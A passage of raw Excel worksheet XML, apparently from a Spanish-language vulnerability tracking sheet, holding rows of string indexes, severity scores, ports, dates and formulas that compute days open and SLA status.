      <c r="Q248" s="6" t="s">
        <v>989</v>
      </c>
      <c r="R248" s="4">
        <v>443</v>
      </c>
      <c r="S248" s="22"/>
      <c r="T248" s="8">
        <v>41598</v>
      </c>
      <c r="U248" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>4611</v>
      </c>
      <c r="V248" s="8">
        <f t="shared" si="10"/>
        <v>41688</v>
      </c>
      <c r="W248" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X248" s="12"/>
      <c r="Y248" s="11"/>
      <c r="Z248" s="11"/>
      <c r="AA248" s="8">
        <v>45273</v>
      </c>
      <c r="AB248" s="32" t="s">
        <v>1008</v>
      </c>
      <c r="AC248" s="32" t="s">
        <v>1009</v>
      </c>
      <c r="AD248" s="9" t="s">
        <v>1010</v>
      </c>
      <c r="AE248" s="8"/>
      <c r="AF248" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG248" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="249" spans="1:33" ht="188.5" x14ac:dyDescent="0.35">
      <c r="A249" s="5">
        <v>248</v>
      </c>
      <c r="B249" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C249" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D249" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E249" s="4"/>
      <c r="F249" s="4"/>
      <c r="G249" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H249" s="4" t="s">
        <v>1011</v>
      </c>
      <c r="I249" s="4"/>
      <c r="J249" s="4" t="s">
        <v>1012</v>
      </c>
      <c r="K249" s="6"/>
      <c r="L249" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M249" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N249" s="5">
        <v>6.8</v>
      </c>
      <c r="O249" s="14"/>
      <c r="P249" s="10" t="s">
        <v>1007</v>
      </c>
      <c r="Q249" s="6"/>
      <c r="R249" s="4">
        <v>443</v>
      </c>
      <c r="S249" s="22"/>
      <c r="T249" s="8">
        <v>41598</v>
      </c>
      <c r="U249" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>4611</v>
      </c>
      <c r="V249" s="8">
        <f t="shared" si="10"/>
        <v>41688</v>
      </c>
      <c r="W249" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X249" s="12"/>
      <c r="Y249" s="11"/>
      <c r="Z249" s="11"/>
      <c r="AA249" s="8">
        <v>45273</v>
      </c>
      <c r="AB249" s="32" t="s">
        <v>1013</v>
      </c>
      <c r="AC249" s="32" t="s">
        <v>1014</v>
      </c>
      <c r="AD249" s="9" t="s">
        <v>1015</v>
      </c>
      <c r="AE249" s="8"/>
      <c r="AF249" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG249" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="250" spans="1:33" ht="145" x14ac:dyDescent="0.35">
      <c r="A250" s="5">
        <v>249</v>
      </c>
      <c r="B250" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C250" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D250" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E250" s="4"/>
      <c r="F250" s="4"/>
      <c r="G250" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H250" s="4" t="s">
        <v>1016</v>
      </c>
      <c r="I250" s="4"/>
      <c r="J250" s="4" t="s">
        <v>1017</v>
      </c>
      <c r="K250" s="6"/>
      <c r="L250" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M250" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N250" s="5">
        <v>5</v>
      </c>
      <c r="O250" s="14"/>
      <c r="P250" s="10" t="s">
        <v>1007</v>
      </c>
      <c r="Q250" s="6"/>
      <c r="R250" s="4">
        <v>443</v>
      </c>
      <c r="S250" s="22"/>
      <c r="T250" s="8">
        <v>41598</v>
      </c>
      <c r="U250" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>4611</v>
      </c>
      <c r="V250" s="8">
        <f t="shared" si="10"/>
        <v>41688</v>
      </c>
      <c r="W250" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X250" s="12"/>
      <c r="Y250" s="11"/>
      <c r="Z250" s="11"/>
      <c r="AA250" s="8">
        <v>45273</v>
      </c>
      <c r="AB250" s="32" t="s">
        <v>1018</v>
      </c>
      <c r="AC250" s="32" t="s">
        <v>1019</v>
      </c>
      <c r="AD250" s="9" t="s">
        <v>1020</v>
      </c>
      <c r="AE250" s="8"/>
      <c r="AF250" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG250" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="251" spans="1:33" ht="217.5" x14ac:dyDescent="0.35">
      <c r="A251" s="5">
        <v>250</v>
      </c>
      <c r="B251" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C251" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D251" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E251" s="4"/>
      <c r="F251" s="4"/>
      <c r="G251" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H251" s="4" t="s">
        <v>1021</v>
      </c>
      <c r="I251" s="4"/>
      <c r="J251" s="4" t="s">
        <v>1022</v>
      </c>
      <c r="K251" s="6"/>
      <c r="L251" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M251" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N251" s="5">
        <v>4.3</v>
      </c>
      <c r="O251" s="14"/>
      <c r="P251" s="10" t="s">
        <v>1007</v>
      </c>
      <c r="Q251" s="6" t="s">
        <v>989</v>
      </c>
      <c r="R251" s="4">
        <v>443</v>
      </c>
      <c r="S251" s="22"/>
      <c r="T251" s="8">
        <v>41598</v>
      </c>
      <c r="U251" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>4611</v>
      </c>
      <c r="V251" s="8">
        <f t="shared" si="10"/>
        <v>41688</v>
      </c>
      <c r="W251" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X251" s="12"/>
      <c r="Y251" s="11"/>
      <c r="Z251" s="11"/>
      <c r="AA251" s="8">
        <v>45273</v>
      </c>
      <c r="AB251" s="32" t="s">
        <v>1023</v>
      </c>
      <c r="AC251" s="32" t="s">
        <v>1024</v>
      </c>
      <c r="AD251" s="9" t="s">
        <v>1025</v>
      </c>
      <c r="AE251" s="8"/>
      <c r="AF251" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG251" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="252" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A252" s="5">
        <v>251</v>
      </c>
      <c r="B252" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C252" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D252" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E252" s="4"/>
      <c r="F252" s="4"/>
      <c r="G252" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H252" s="4" t="s">
        <v>1026</v>
      </c>
      <c r="I252" s="4"/>
      <c r="J252" s="4" t="s">
        <v>1027</v>
      </c>
      <c r="K252" s="6"/>
      <c r="L252" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M252" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N252" s="5">
        <v>5</v>
      </c>
      <c r="O252" s="14"/>
      <c r="P252" s="10" t="s">
        <v>1007</v>
      </c>
      <c r="Q252" s="6" t="s">
        <v>989</v>
      </c>
      <c r="R252" s="4">
        <v>443</v>
      </c>
      <c r="S252" s="22"/>
      <c r="T252" s="8">
        <v>41598</v>
      </c>
      <c r="U252" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>4611</v>
      </c>
      <c r="V252" s="8">
        <f t="shared" si="10"/>
        <v>41688</v>
      </c>
      <c r="W252" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X252" s="12"/>
      <c r="Y252" s="11"/>
      <c r="Z252" s="11"/>
      <c r="AA252" s="8">
        <v>45273</v>
      </c>
      <c r="AB252" s="32" t="s">
        <v>1028</v>
      </c>
      <c r="AC252" s="32" t="s">
        <v>1029</v>
      </c>
      <c r="AD252" s="9" t="s">
        <v>1030</v>
      </c>
      <c r="AE252" s="8"/>
      <c r="AF252" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG252" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="253" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A253" s="5">
        <v>252</v>
      </c>
      <c r="B253" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C253" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D253" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E253" s="4"/>
      <c r="F253" s="4"/>
      <c r="G253" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H253" s="4" t="s">
        <v>1031</v>
      </c>
      <c r="I253" s="4"/>
      <c r="J253" s="4" t="s">
        <v>459</v>
      </c>
      <c r="K253" s="6"/>
      <c r="L253" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M253" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N253" s="5">
        <v>5.3</v>
      </c>
      <c r="O253" s="14"/>
      <c r="P253" s="10"/>
      <c r="Q253" s="6" t="s">
        <v>989</v>
      </c>
      <c r="R253" s="4"/>
      <c r="S253" s="22"/>
      <c r="T253" s="8">
        <v>45262</v>
      </c>
      <c r="U253" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>947</v>
      </c>
      <c r="V253" s="8">
        <f t="shared" si="10"/>
        <v>45352</v>
      </c>
      <c r="W253" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X253" s="12"/>
      <c r="Y253" s="11"/>
      <c r="Z253" s="11"/>
      <c r="AA253" s="8">
        <v>45271</v>
      </c>
      <c r="AB253" s="32" t="s">
        <v>1032</v>
      </c>
      <c r="AC253" s="32" t="s">
        <v>957</v>
      </c>
      <c r="AD253" s="9"/>
      <c r="AE253" s="8" t="s">
        <v>147</v>
      </c>
      <c r="AF253" s="27" t="s">
        <v>684</v>
      </c>
      <c r="AG253" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="254" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A254" s="5">
        <v>253</v>
      </c>
      <c r="B254" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C254" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D254" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E254" s="4"/>
      <c r="F254" s="4"/>
      <c r="G254" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H254" s="4" t="s">
        <v>1033</v>
      </c>
      <c r="I254" s="4" t="s">
        <v>1034</v>
      </c>
      <c r="J254" s="4" t="s">
        <v>1035</v>
      </c>
      <c r="K254" s="6"/>
      <c r="L254" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M254" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N254" s="5">
        <v>3.7</v>
      </c>
      <c r="O254" s="14"/>
      <c r="P254" s="10"/>
      <c r="Q254" s="6" t="s">
        <v>143</v>
      </c>
      <c r="R254" s="4"/>
      <c r="S254" s="22"/>
      <c r="T254" s="8">
        <v>45260</v>
      </c>
      <c r="U254" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>949</v>
      </c>
      <c r="V254" s="8">
        <f t="shared" si="10"/>
        <v>45380</v>
      </c>
      <c r="W254" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X254" s="12"/>
      <c r="Y254" s="11"/>
      <c r="Z254" s="11"/>
      <c r="AA254" s="8">
        <v>45692</v>
      </c>
      <c r="AB254" s="32" t="s">
        <v>1036</v>
      </c>
      <c r="AC254" s="32" t="s">
        <v>1037</v>
      </c>
      <c r="AD254" s="9" t="s">
        <v>1038</v>
      </c>
      <c r="AE254" s="27" t="s">
        <v>1039</v>
      </c>
      <c r="AF254" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG254" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="255" spans="1:33" ht="159.5" x14ac:dyDescent="0.35">
      <c r="A255" s="5">
        <v>254</v>
      </c>
      <c r="B255" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C255" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D255" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E255" s="4"/>
      <c r="F255" s="4"/>
      <c r="G255" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H255" s="4" t="s">
        <v>1040</v>
      </c>
      <c r="I255" s="4" t="s">
        <v>1041</v>
      </c>
      <c r="J255" s="4" t="s">
        <v>1042</v>
      </c>
      <c r="K255" s="6"/>
      <c r="L255" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M255" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N255" s="5">
        <v>4.2</v>
      </c>
      <c r="O255" s="14" t="s">
        <v>1043</v>
      </c>
      <c r="P255" s="10"/>
      <c r="Q255" s="6" t="s">
        <v>989</v>
      </c>
      <c r="R255" s="4"/>
      <c r="S255" s="22"/>
      <c r="T255" s="8">
        <v>45393</v>
      </c>
      <c r="U255" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>816</v>
      </c>
      <c r="V255" s="8">
        <f t="shared" si="10"/>
        <v>45483</v>
      </c>
      <c r="W255" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X255" s="12"/>
      <c r="Y255" s="11"/>
      <c r="Z255" s="11"/>
      <c r="AA255" s="8">
        <v>45503</v>
      </c>
      <c r="AB255" s="32" t="s">
        <v>1044</v>
      </c>
      <c r="AC255" s="32" t="s">
        <v>1045</v>
      </c>
      <c r="AD255" s="9" t="s">
        <v>1046</v>
      </c>
      <c r="AE255" s="8" t="s">
        <v>147</v>
      </c>
      <c r="AF255" s="27"/>
      <c r="AG255" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="256" spans="1:33" ht="409.5" x14ac:dyDescent="0.35">
      <c r="A256" s="5">
        <v>255</v>
      </c>
      <c r="B256" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C256" s="5" t="s">
        <v>425</v>
      </c>
      <c r="D256" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E256" s="4"/>
      <c r="F256" s="4"/>
      <c r="G256" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H256" s="4"/>
      <c r="I256" s="4"/>
      <c r="J256" s="4" t="s">
        <v>1047</v>
      </c>
      <c r="K256" s="6"/>
      <c r="L256" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M256" s="5" t="s">
        <v>1048</v>
      </c>
      <c r="N256" s="5"/>
      <c r="O256" s="14"/>
      <c r="P256" s="10"/>
      <c r="Q256" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R256" s="4">
        <v>443</v>
      </c>
      <c r="S256" s="22"/>
      <c r="T256" s="8">
        <v>45168</v>
      </c>
      <c r="U256" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1041</v>
      </c>
      <c r="V256" s="8" t="str">
        <f t="shared" si="10"/>
        <v/>
      </c>
      <c r="W256" s="12" t="str">
        <f t="shared" si="11"/>
        <v>Error</v>
      </c>
      <c r="X256" s="12"/>
      <c r="Y256" s="11"/>
      <c r="Z256" s="11"/>
      <c r="AA256" s="8"/>
      <c r="AB256" s="32" t="s">
        <v>1049</v>
      </c>
      <c r="AC256" s="32" t="s">
        <v>1050</v>
      </c>
      <c r="AD256" s="9"/>
      <c r="AE256" s="27" t="s">
        <v>1051</v>
      </c>
      <c r="AF256" s="27"/>
      <c r="AG256" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="257" spans="1:33" ht="188.5" x14ac:dyDescent="0.35">
      <c r="A257" s="5">
        <v>256</v>
      </c>
      <c r="B257" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C257" s="5" t="s">
        <v>425</v>
      </c>
      <c r="D257" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E257" s="4"/>
      <c r="F257" s="4"/>
      <c r="G257" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H257" s="4"/>
      <c r="I257" s="4"/>
      <c r="J257" s="4" t="s">
        <v>1052</v>
      </c>
      <c r="K257" s="6"/>
      <c r="L257" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M257" s="5" t="s">
        <v>427</v>
      </c>
      <c r="N257" s="5"/>
      <c r="O257" s="14"/>
      <c r="P257" s="10"/>
      <c r="Q257" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R257" s="4">
        <v>443</v>
      </c>
      <c r="S257" s="22"/>
      <c r="T257" s="8">
        <v>45221</v>
      </c>
      <c r="U257" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>988</v>
      </c>
      <c r="V257" s="8">
        <f t="shared" si="10"/>
        <v>45341</v>
      </c>
      <c r="W257" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X257" s="12"/>
      <c r="Y257" s="11"/>
      <c r="Z257" s="11"/>
      <c r="AA257" s="8"/>
      <c r="AB257" s="32" t="s">
        <v>1053</v>
      </c>
      <c r="AC257" s="32" t="s">
        <v>1054</v>
      </c>
      <c r="AD257" s="9"/>
      <c r="AE257" s="27" t="s">
        <v>1055</v>
      </c>
      <c r="AF257" s="27"/>
      <c r="AG257" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="258" spans="1:33" ht="145" x14ac:dyDescent="0.35">
      <c r="A258" s="5">
        <v>257</v>
      </c>
      <c r="B258" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C258" s="5" t="s">
        <v>425</v>
      </c>
      <c r="D258" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E258" s="4"/>
      <c r="F258" s="4"/>
      <c r="G258" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H258" s="4"/>
      <c r="I258" s="4"/>
      <c r="J258" s="4" t="s">
        <v>1056</v>
      </c>
      <c r="K258" s="6"/>
      <c r="L258" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M258" s="5" t="s">
        <v>427</v>
      </c>
      <c r="N258" s="5"/>
      <c r="O258" s="14"/>
      <c r="P258" s="10"/>
      <c r="Q258" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R258" s="4">
        <v>443</v>
      </c>
      <c r="S258" s="22"/>
      <c r="T258" s="8">
        <v>45168</v>
      </c>
      <c r="U258" s="11">
        <f t="shared" ref="U258:U321" ca="1" si="12">TODAY()-T258</f>
        <v>1041</v>
      </c>
      <c r="V258" s="8">
        <f t="shared" ref="V258:V321" si="13">IF(M258="Critical",T258+10,IF(M258="High",T258+30,IF(M258="Bad",T258+30,IF(M258="Medium",T258+90,IF(M258="Warm",T258+90,IF(M258="Low",T258+120,IF(M258="Fair",T258+120,IF(M258="Neutral",T258+120,""))))))))</f>
        <v>45288</v>
      </c>
      <c r="W258" s="12" t="str">
        <f t="shared" ref="W258:W321" ca="1" si="14">IF(M258="Critical",IF(U258&gt;10,"SLA Vencido","En SLA"),IF(M258="High",IF(U258&gt;30,"SLA Vencido","En SLA"),IF(M258="Bad",IF(U258&gt;30,"SLA Vencido","En SLA"),IF(M258="Medium",IF(U258&gt;90,"SLA Vencido","En SLA"),IF(M258="Warm",IF(U258&gt;90,"SLA Vencido","En SLA"),IF(M258="Low",IF(U258&gt;120,"SLA Vencido","En SLA"),IF(M258="Fair",IF(U258&gt;120,"SLA Vencido","En SLA"),IF(M258="Neutral",IF(U258&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="X258" s="12"/>
      <c r="Y258" s="11"/>
      <c r="Z258" s="11"/>
      <c r="AA258" s="8"/>
      <c r="AB258" s="32" t="s">
        <v>1057</v>
      </c>
      <c r="AC258" s="32" t="s">
        <v>1058</v>
      </c>
      <c r="AD258" s="9"/>
      <c r="AE258" s="27" t="s">
        <v>1055</v>
      </c>
      <c r="AF258" s="27"/>
      <c r="AG258" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="259" spans="1:33" ht="330.75" customHeight="1" x14ac:dyDescent="0.35">
      <c r="A259" s="5">
        <v>258</v>
      </c>
      <c r="B259" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C259" s="5" t="s">
        <v>425</v>
      </c>
      <c r="D259" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E259" s="4"/>
      <c r="F259" s="4"/>
      <c r="G259" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H259" s="4"/>
      <c r="I259" s="4"/>
      <c r="J259" s="4" t="s">
        <v>1059</v>
      </c>
      <c r="K259" s="6"/>
      <c r="L259" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M259" s="5" t="s">
        <v>427</v>
      </c>
      <c r="N259" s="5"/>
      <c r="O259" s="14"/>
      <c r="P259" s="10"/>
      <c r="Q259" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R259" s="4">
        <v>443</v>
      </c>
      <c r="S259" s="22"/>
      <c r="T259" s="8">
        <v>44971</v>
      </c>
      <c r="U259" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>1238</v>
      </c>
      <c r="V259" s="8">
        <f t="shared" si="13"/>
        <v>45091</v>
      </c>
      <c r="W259" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X259" s="12"/>
      <c r="Y259" s="11"/>
      <c r="Z259" s="11"/>
      <c r="AA259" s="8"/>
      <c r="AB259" s="32" t="s">
        <v>1060</v>
      </c>
      <c r="AC259" s="32" t="s">
        <v>1061</v>
      </c>
      <c r="AD259" s="9"/>
      <c r="AE259" s="27" t="s">
        <v>1055</v>
      </c>
      <c r="AF259" s="27"/>
      <c r="AG259" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="260" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A260" s="5">
        <v>259</v>
      </c>
      <c r="B260" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C260" s="5" t="s">
        <v>630</v>
      </c>
      <c r="D260" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E260" s="4"/>
      <c r="F260" s="4"/>
      <c r="G260" s="6" t="s">
        <v>1062</v>
      </c>
      <c r="H260" s="4"/>
      <c r="I260" s="4"/>
      <c r="J260" s="4" t="s">
        <v>1063</v>
      </c>
      <c r="K260" s="6"/>
      <c r="L260" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M260" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N260" s="5"/>
      <c r="O260" s="14"/>
      <c r="P260" s="10" t="s">
        <v>1064</v>
      </c>
      <c r="Q260" s="6"/>
      <c r="R260" s="4">
        <v>53</v>
      </c>
      <c r="S260" s="22"/>
      <c r="T260" s="8">
        <v>45398</v>
      </c>
      <c r="U260" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>811</v>
      </c>
      <c r="V260" s="8">
        <f t="shared" si="13"/>
        <v>45488</v>
      </c>
      <c r="W260" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X260" s="12"/>
      <c r="Y260" s="11"/>
      <c r="Z260" s="11"/>
      <c r="AA260" s="8" t="s">
        <v>1065</v>
      </c>
      <c r="AB260" s="32" t="s">
        <v>1066</v>
      </c>
      <c r="AC260" s="32" t="s">
        <v>1067</v>
      </c>
      <c r="AD260" s="9"/>
      <c r="AE260" s="8"/>
      <c r="AF260" s="27"/>
      <c r="AG260" s="27" t="s">
        <v>594</v>
      </c>
    </row>
    <row r="261" spans="1:33" ht="120" customHeight="1" x14ac:dyDescent="0.35">
      <c r="A261" s="5">
        <v>260</v>
      </c>
      <c r="B261" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C261" s="5" t="s">
        <v>1068</v>
      </c>
      <c r="D261" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E261" s="4"/>
      <c r="F261" s="4"/>
      <c r="G261" s="6" t="s">
        <v>1069</v>
      </c>
      <c r="H261" s="4" t="s">
        <v>1070</v>
      </c>
      <c r="I261" s="4"/>
      <c r="J261" s="4" t="s">
        <v>1071</v>
      </c>
      <c r="K261" s="6"/>
      <c r="L261" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M261" s="5" t="s">
        <v>522</v>
      </c>
      <c r="N261" s="5"/>
      <c r="O261" s="14"/>
      <c r="P261" s="10"/>
      <c r="Q261" s="6" t="s">
        <v>1072</v>
      </c>
      <c r="R261" s="4"/>
      <c r="S261" s="22"/>
      <c r="T261" s="8">
        <v>45401</v>
      </c>
      <c r="U261" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>808</v>
      </c>
      <c r="V261" s="8">
        <f t="shared" si="13"/>
        <v>45431</v>
      </c>
      <c r="W261" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X261" s="12"/>
      <c r="Y261" s="11"/>
      <c r="Z261" s="11"/>
      <c r="AA261" s="8">
        <v>45517</v>
      </c>
      <c r="AB261" s="32" t="s">
        <v>1073</v>
      </c>
      <c r="AC261" s="32" t="s">
        <v>1074</v>
      </c>
      <c r="AD261" s="9"/>
      <c r="AE261" s="8"/>
      <c r="AF261" s="27" t="s">
        <v>1075</v>
      </c>
      <c r="AG261" s="27" t="s">
        <v>747</v>
      </c>
    </row>
    <row r="262" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A262" s="5">
        <v>261</v>
      </c>
      <c r="B262" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C262" s="5" t="s">
        <v>630</v>
      </c>
      <c r="D262" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E262" s="4"/>
      <c r="F262" s="4"/>
      <c r="G262" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H262" s="4"/>
      <c r="I262" s="4"/>
      <c r="J262" s="4" t="s">
        <v>1076</v>
      </c>
      <c r="K262" s="6"/>
      <c r="L262" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M262" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N262" s="5"/>
      <c r="O262" s="14"/>
      <c r="P262" s="10"/>
      <c r="Q262" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R262" s="4"/>
      <c r="S262" s="22"/>
      <c r="T262" s="8">
        <v>45404</v>
      </c>
      <c r="U262" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>805</v>
      </c>
      <c r="V262" s="8">
        <f t="shared" si="13"/>
        <v>45524</v>
      </c>
      <c r="W262" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X262" s="12"/>
      <c r="Y262" s="11"/>
      <c r="Z262" s="11"/>
      <c r="AA262" s="8">
        <v>45686</v>
      </c>
      <c r="AB262" s="32" t="s">
        <v>1077</v>
      </c>
      <c r="AC262" s="39" t="s">
        <v>1078</v>
      </c>
      <c r="AD262" s="9" t="s">
        <v>1079</v>
      </c>
      <c r="AE262" s="27" t="s">
        <v>792</v>
      </c>
      <c r="AF262" s="27"/>
      <c r="AG262" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="263" spans="1:33" ht="159.5" x14ac:dyDescent="0.35">
      <c r="A263" s="5">
        <v>262</v>
      </c>
      <c r="B263" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C263" s="5" t="s">
        <v>630</v>
      </c>
      <c r="D263" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E263" s="4"/>
      <c r="F263" s="4"/>
      <c r="G263" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H263" s="4"/>
      <c r="I263" s="4"/>
      <c r="J263" s="4" t="s">
        <v>1080</v>
      </c>
      <c r="K263" s="6"/>
      <c r="L263" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M263" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N263" s="5"/>
      <c r="O263" s="14"/>
      <c r="P263" s="10"/>
      <c r="Q263" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R263" s="4"/>
      <c r="S263" s="22"/>
      <c r="T263" s="8">
        <v>45404</v>
      </c>
      <c r="U263" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>805</v>
      </c>
      <c r="V263" s="8">
        <f t="shared" si="13"/>
        <v>45524</v>
      </c>
      <c r="W263" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X263" s="12"/>
      <c r="Y263" s="11"/>
      <c r="Z263" s="11"/>
      <c r="AA263" s="8">
        <v>45686</v>
      </c>
      <c r="AB263" s="32" t="s">
        <v>1081</v>
      </c>
      <c r="AC263" s="39" t="s">
        <v>1082</v>
      </c>
      <c r="AD263" s="9" t="s">
        <v>1083</v>
      </c>
      <c r="AE263" s="27" t="s">
        <v>792</v>
      </c>
      <c r="AF263" s="27"/>
      <c r="AG263" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="264" spans="1:33" ht="159.5" x14ac:dyDescent="0.35">
      <c r="A264" s="5">
        <v>263</v>
      </c>
      <c r="B264" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C264" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D264" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E264" s="4"/>
      <c r="F264" s="4"/>
      <c r="G264" s="6" t="s">
        <v>1084</v>
      </c>
      <c r="H264" s="4" t="s">
        <v>1085</v>
      </c>
